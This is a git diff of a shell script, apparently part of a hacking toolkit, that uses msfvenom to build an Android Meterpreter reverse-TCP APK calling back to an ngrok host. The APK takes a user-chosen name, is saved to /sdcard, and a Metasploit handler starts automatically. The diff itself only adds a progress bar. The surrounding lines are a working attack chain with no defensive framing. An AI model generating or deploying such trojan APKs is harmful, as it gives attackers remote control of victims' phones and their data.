@@ -12,7 +12,13 @@ rm -rf /$HOME/a/LPORT.rc
 echo set LPORT $LPORT >/$HOME/a/LPORT.rc
 echo Apk name: | lolcat
 read -p '>> ' APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk & PID=$!
+echo "Generating Apk.." | lolcat
+printf "["
+while kill -0 $PID 2> /dev/null; do
+    printf  "▓"
+    sleep 2
+done
 msfconsole -r auto.rc
      else
 echo 'you must run this commamd to start: '
